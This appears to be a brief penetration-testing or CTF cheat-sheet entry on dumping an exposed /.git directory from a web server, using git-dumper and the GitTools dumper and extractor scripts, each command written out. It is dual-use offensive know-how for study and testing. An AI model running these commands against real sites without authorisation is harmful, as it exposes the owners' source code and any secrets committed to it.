
If you find a /.git you can clone it using git-dumper.
```
git-dumper http://ip/.git/ ./dumped
```

If you don't have access to the .git you can also use `https://github.com/internetwache/GitTools/tree/master`. 
You will need to use the dumper first:
```
./gitdumper.sh http://ip/.git destination-dir
```
And then use the extractor:
```
./extractor.sh destination-dir/ extracted-dir
```
Don't forget to chmod +x the script.